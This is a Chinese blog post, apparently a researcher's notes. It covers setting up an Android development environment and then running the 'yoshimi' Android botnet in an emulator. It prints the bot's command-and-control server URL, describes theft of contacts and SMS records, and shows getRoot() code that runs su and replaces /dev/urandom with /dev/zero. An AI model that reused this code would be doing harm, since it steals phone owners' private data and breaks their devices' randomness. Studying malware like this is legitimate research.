@@ -1,0 +1,52 @@
+Android开发环境的搭建虽然简单，但由于需要下载的sdk和扩展包非常大，速度又慢。还好恺哥有完整的，直接复制过来，太感谢啦。
+
+Android SDK和Eclipse的安装过程网上非常多见，本文不再介绍。我是在windows下进行的，linux下区别不大。安装好之后，就可以调试和测试自己的app了。
+
+第一次用时可以存在Eclipse和sdk的关联问题：当使用Eclipse创建Andriod工程时可能Build Target选项为空，这是因为Eclipse与SDK未关联上。设置下SDK的位置就行了。具体步骤：打开window—>preferences，选中android选项，SDK Location指向你的android目录。
+
+如果项目提示没有android包的错误，需要进入project——Properties——Android，在Project Build Target里面勾选相应的SDK即可解决，一般情况下会自动选择的。
+
+
+在AVD（Android Virtual Device）里安装app，一般有两种方法：
+如果已经有了编译好的apk，可以直接在platform-tools目录下安装app：
+[code]
+$ adb install softname.apk
+[/code]
+adb是Android Debug Bridge，其常用命令有
+adb install/uninstall/push/pull
+
+另一个安装app的方法是用eclipse直接运行项目，在运行时一般是先把AVD开起来，会快一些。
+
+好啦，不重要的事情终于结束了，可以开始正式的开发调试工作了。继续研究AndroidBotnet项目yoshimi。
+
+在service的代码中，有一个服务器端host的需要设置才能试客户端能连接到服务器端
+[code]
+private static final String CC_SERVER = "http://12.12.12.114:8888";
+[/code]
+<!--more-->
+
+编译运行客户端Android项目，app在AVD上运行。
+
+这时访问服务器端http://127.0.1.1:8888/
+很快就能看到客户端窃取并发回的信息了。OK！
+
+窃取的信息包括：手机设备的版本信息、手机上的电话簿、通讯录、短信记录。
+还有一个给手机发送信息的功能，试了一下没有反应，有可能是因为虚拟器手机发不出去短信？。
+
+客户端如何获得root权限：在service中的函数getRoot()
+[code lang="java"]
+//申请权限
+proc = Runtime.getRuntime().exec("su");
+//下面这是要干嘛？
+//新建文件
+File f = new File("/dev/randsum");
+//移动文件，建立符号链接
+Runtime.getRuntime().exec("su root -c \"mv /dev/urandom /dev/randsum\" && su root -c \"ln -s /dev/zero /dev/urandom\"");
+// /dev/zero则不停的export 0
+// /dev/urandom用来生成低质量的随机数序列
+[/code]
+
+从代码分析角度，怎么获取Android平台的代码执行轨迹呢？这个问题是比较新的研究方向了。
+
+
+
